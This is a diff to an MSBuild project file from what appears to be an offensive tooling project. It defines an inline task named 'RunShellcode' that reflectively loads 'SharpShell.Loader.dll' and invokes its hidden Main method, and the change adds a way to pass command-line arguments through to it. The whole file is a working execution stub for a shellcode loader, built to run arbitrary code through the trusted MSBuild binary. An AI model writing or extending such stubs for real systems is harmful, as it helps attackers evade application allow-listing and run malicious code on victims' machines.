@@ -1,5 +1,8 @@
 ﻿<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
 	<UsingTask TaskName="RunShellcode" TaskFactory="RoslynCodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
+		<ParameterGroup>
+			<CommandLineArgs ParameterType="System.String"/>
+		</ParameterGroup>
 		<Task>
 			<Using Namespace="System" />
 			<Using Namespace="System.IO" />
@@ -16,13 +19,19 @@
 
 				public class RunShellcode : Task
 				{
+					public string CommandLineArgs { get; set; }
+					
 					public override bool Execute()
 					{
 						var dll = File.ReadAllBytes("SharpShell.Loader.dll");
 						var loader = Assembly.Load(dll);
 						var type = loader.GetType("SharpShell.Loader.Program")!;
 						var method = type.GetMethod("Main", BindingFlags.Static | BindingFlags.NonPublic)!;
-						var res = method.Invoke(null, new object[] {new string[] {}});
+						
+						/* Handle commandline args */
+						var cmdlineArgs = String.IsNullOrEmpty(CommandLineArgs) ? new string[]{} : new string[]{CommandLineArgs};
+
+						var res = method.Invoke(null, new object[] {cmdlineArgs});
 						return true;
 					}
 				}
@@ -32,6 +41,6 @@
 	</UsingTask>
 
 	<Target Name="Run">
-		<RunShellcode />
+		<RunShellcode CommandLineArgs="$(CommandLineArgs)"/>
 	</Target>
 </Project>
